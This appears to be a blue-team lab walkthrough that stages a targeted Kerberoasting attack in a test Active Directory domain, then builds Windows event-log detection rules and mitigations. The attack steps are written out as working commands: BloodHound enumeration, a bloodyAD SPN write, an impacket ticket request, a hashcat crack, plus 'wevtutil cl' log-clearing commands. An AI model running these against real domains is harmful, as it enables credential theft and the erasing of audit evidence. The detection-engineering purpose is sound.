# DACL Attack Detection Lab — Full Walkthrough

**Environment:** Windows Server 2019 (lab2019.local) + Kali Linux  
**Scenario:** GenericWrite misconfiguration → targeted Kerberoasting  
**Goal:** Build the attack, collect telemetry, define detection rules

---

## Phase 0: Lab Setup

### Environment
- DC: `WIN-JOCP945SK51.lab2019.local` / `172.16.61.137`
- Attacker machine: Kali Linux (same subnet)
- Sysmon pre-installed on DC

### Create Test Accounts and Misconfiguration

Run on the DC as Administrator:

```powershell
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force

# alice.walker = compromised attacker account
# bob.harris   = victim (will be Kerberoasted)
# svc.helpdesk = noise account

New-ADUser -Name "alice.walker" -SamAccountName "alice.walker" -AccountPassword $password -Enabled $true
New-ADUser -Name "bob.harris" -SamAccountName "bob.harris" -AccountPassword $password -Enabled $true
New-ADUser -Name "svc.helpdesk" -SamAccountName "svc.helpdesk" -AccountPassword $password -Enabled $true

# Grant alice.walker GenericWrite over bob.harris
$alice = Get-ADUser "alice.walker"
$bob = Get-ADUser "bob.harris"

$acl = Get-ACL "AD:$($bob.DistinguishedName)"
$sid = [System.Security.Principal.SecurityIdentifier]$alice.SID
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $sid,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($rule)
Set-ACL "AD:$($bob.DistinguishedName)" $acl

Write-Host "Done. alice.walker has GenericWrite over bob.harris"
```

---

## Phase 1: Enable Auditing

### Lesson 1: Audit Policy ≠ Actual Auditing

By default, even with DS Access auditing enabled, event 4662 (LDAP object access)
does not fire because AD objects have no SACL entries. The policy enables the
*capability* — SACLs on objects do the actual logging.

Verify audit policy is enabled:
```powershell
auditpol /get /subcategory:"Directory Service Access"
auditpol /get /subcategory:"Directory Service Changes"
```

Check whether the domain object has a SACL:
```powershell
$domain = Get-ADDomain
(Get-Acl "AD:$($domain.DistinguishedName)").Audit
# Empty = no auditing despite policy being enabled
```

### Fix: Add SACL to Domain Root

```powershell
$root = (Get-ADDomain).DistinguishedName
$acl = Get-Acl "AD:$root"

$everyone = [System.Security.Principal.SecurityIdentifier]"S-1-1-0"
$auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
    $everyone,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AuditFlags]::Success,
    [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
)
$acl.AddAuditRule($auditRule)
Set-Acl "AD:$root" $acl

Write-Host "SACL configured on domain root — 4662 will now fire"
```

---

## Phase 2: Attack — Reconnaissance (BloodHound)

### Setup from Kali

```bash
# Point DNS at the DC
echo "nameserver 172.16.61.137" | sudo tee /etc/resolv.conf
echo "172.16.61.137 WIN-JOCP945SK51.lab2019.local" | sudo tee -a /etc/hosts
```

### Clear logs on DC first (clean baseline)

```powershell
wevtutil cl Security
wevtutil cl System
```

### Run BloodHound Collection

```bash
bloodhound-python -u alice.walker -p Password123! -d lab2019.local \
  -ns 172.16.61.137 -dc WIN-JOCP945SK51.lab2019.local -c all --zip
```

BloodHound will enumerate all users, groups, computers, ACLs, and sessions via LDAP.
The `GenericWrite` edge from alice.walker to bob.harris will be visible in the graph.

---

## Phase 3: Detection — BloodHound Telemetry

### Pull event counts immediately after collection

```powershell
$since = (Get-Date).AddMinutes(-5)

Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -gt $since -and $_.Id -in @(4662, 5136, 4624, 4776)
} | Select-Object TimeCreated, Id | Group-Object Id | Select-Object Name, Count
```

**Result:**
```
Name  Count
----  -----
4624     4     ← NTLM logon events
4662   737     ← LDAP object access events
```

### Break down who generated the 4662 events

```powershell
$since = (Get-Date).AddMinutes(-5)

Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -gt $since -and $_.Id -eq 4662
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    ($xml.Event.EventData.Data | Where-Object Name -eq 'SubjectUserName').'#text'
} | Group-Object | Select-Object Name, Count | Sort-Object Count -Descending
```

**Result:**
```
Name              Count
----              -----
alice.walker        729
WIN-JOCP945SK51$      8
```

### Measure the time window

```powershell
$since = (Get-Date).AddMinutes(-5)

$events = Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -gt $since -and $_.Id -eq 4662
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time   = $_.TimeCreated
        User   = ($xml.Event.EventData.Data | Where-Object Name -eq 'SubjectUserName').'#text'
        Object = ($xml.Event.EventData.Data | Where-Object Name -eq 'ObjectName').'#text'
    }
} | Where-Object User -eq 'alice.walker'

$events | Measure-Object | Select-Object Count
$events | Measure-Object -Property Time -Minimum -Maximum
$events | Select-Object Object -Unique | Measure-Object | Select-Object Count
```

**Result:**
```
Total events  : 729
Time window   : < 1 second (min = max = 04:16:20)
Unique objects: 190
```

### Detection Rule — BloodHound / LDAP Enumeration

> **Alert:** Non-machine account generates >50 × Event 4662 against >20 unique objects within a 5-second window.

No legitimate user touches 190 AD objects in under a second.

---

## Phase 4: Attack — SPN Injection + Kerberoast

GenericWrite over a user object allows writing to `servicePrincipalName`.
Once a user has a SPN, any domain user can request a Kerberos service ticket
for that account — encrypted with the account's NT hash — and crack it offline.

### From Kali

```bash
# Step 1: Write fake SPN to bob.harris
bloodyAD -u alice.walker -p Password123! -d lab2019.local \
  --dc-ip 172.16.61.137 set object bob.harris servicePrincipalName \
  -v "MSSQLSvc/fake.lab2019.local:1433"

# Step 2: Request Kerberos service ticket (Kerberoast)
impacket-GetUserSPNs lab2019.local/alice.walker:Password123! \
  -dc-ip 172.16.61.137 -request-user bob.harris -outputfile bob.hash

# Step 3: Crack offline
hashcat -m 13100 bob.hash /usr/share/wordlists/rockyou.txt
```

---

## Phase 5: Detection — SPN Write + Kerberoast Telemetry

### Pull attack events

```powershell
$since = (Get-Date).AddMinutes(-3)

Get-WinEvent -LogName Security | Where-Object {
    $_.TimeCreated -gt $since -and $_.Id -in @(4738, 5136, 4769)
} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $data = $xml.Event.EventData.Data
    [PSCustomObject]@{
        EventID  = $_.Id
        Time     = $_.TimeCreated
        Subject  = ($data | Where-Object Name -eq 'SubjectUserName').'#text'
        Target   = ($data | Where-Object Name -eq 'TargetUserName').'#text'
        Service  = ($data | Where-Object Name -eq 'ServiceName').'#text'
        AttrName = ($data | Where-Object Name -eq 'AttributeLDAPDisplayName').'#text'
        AttrVal  = ($data | Where-Object Name -eq 'AttributeValue').'#text'
    }
} | Format-List
```

**Result:**
```
EventID  : 5136
Time     : 04:19:27
Subject  : alice.walker
AttrName : servicePrincipalName
AttrVal  : MSSQLSvc/fake.lab2019.local:1433

EventID  : 4738
Time     : 04:19:27
Subject  : alice.walker
Target   : bob.harris

EventID  : 4769
Time     : 04:19:34
Target   : alice.walker@LAB2019.LOCAL
Service  : bob.harris
```

### What the three events tell you

| Event | What Happened | Red Flag |
|---|---|---|
| 5136 | alice.walker wrote a SPN to bob.harris | Regular user accounts should not have SPNs written to them |
| 4738 | bob.harris account was modified | Corroborates 5136 |
| 4769 | alice.walker requested a ticket for bob.harris | Same user wrote the SPN and requested the ticket 7 seconds later |

### Detection Rule — Targeted Kerberoasting

> **Alert 1:** Event 5136 where `AttributeLDAPDisplayName = servicePrincipalName` on a user object (not a service account OU).

> **Alert 2:** Event 5136 followed by Event 4769 for the same target account within 60 seconds, where the requesting user is the same user who wrote the SPN.

The 7-second gap between SPN write and ticket request is definitive. Legitimate service account registration never produces this pattern.

---

## Full Attack Timeline

```
04:16:20  alice.walker generates 729 × Event 4662 in <1 second
          → BloodHound ACL enumeration
          → Discovers GenericWrite edge over bob.harris

04:19:27  alice.walker writes servicePrincipalName to bob.harris
          → Event 5136 (attribute written)
          → Event 4738 (account modified)

04:19:34  alice.walker requests Kerberos ticket for bob.harris
          → Event 4769 (TGS request)
          → Encrypted ticket saved to bob.hash
          → Offline crack begins
```

---

## Blue Team Summary

### What requires configuration to detect

| Gap | Fix |
|---|---|
| 4662 not firing despite DS Access audit policy enabled | Add SACL to domain root object — policy enables capability, SACLs do the work |
| No baseline for "normal" 4662 volume | Machine accounts generate ~8 per session; >50 from a user account is anomalous |

### Detection rules in priority order

1. **Burst of 4662 from non-machine account** — reconnaissance in progress
2. **5136 writing servicePrincipalName to a user object** — targeted Kerberoasting setup
3. **4769 for same account within 60s of 5136** — Kerberoasting execution confirmed

### Mitigation

- Remove GenericWrite from non-admin accounts (audit with BloodHound regularly)
- Use Protected Users security group for sensitive accounts — prevents Kerberos delegation and RC4 downgrade
- Enable fine-grained password policies for service accounts — long random passwords make Kerberoasted hashes uncrackable in practice
- Alert on 4769 events requesting RC4 tickets (`TicketEncryptionType = 0x17`) for accounts that don't normally have SPNs

<img width="814" height="742" alt="daclblueteam" src="https://github.com/user-attachments/assets/a33961b5-07c9-4911-9012-b354804a5147" />
<img width="861" height="477" alt="Bloodhound" src="https://github.com/user-attachments/assets/1adb68f3-e30e-4ee9-a335-25acca99a5a9" />


